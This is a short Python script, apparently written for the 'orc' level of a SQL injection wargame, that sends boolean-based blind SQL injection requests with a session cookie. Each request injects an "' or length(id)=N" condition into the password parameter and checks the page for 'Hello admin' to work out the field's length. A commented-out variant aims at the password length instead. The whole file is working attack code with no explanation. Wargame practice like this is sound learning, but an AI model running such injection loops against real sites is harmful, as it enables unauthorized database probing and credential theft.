# python 3.6.4
import urllib.request


for i in range(1,9):
	url="http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=asdf'%20or%20length(id)={0}%23".format(i)
	print(url)
	# url="http://los.rubiya.kr/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=*' or length(pw)={0}%23".format(i)
	r = urllib.request.Request(url)
	r.add_header("Cookie","PHPSESSID=1a1hlpne9kfc84ivkcmr5pd011")
	data = urllib.request.urlopen(r).read().decode('utf-8')
	if data.find("Hello admin") != -1:
		print("wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww")




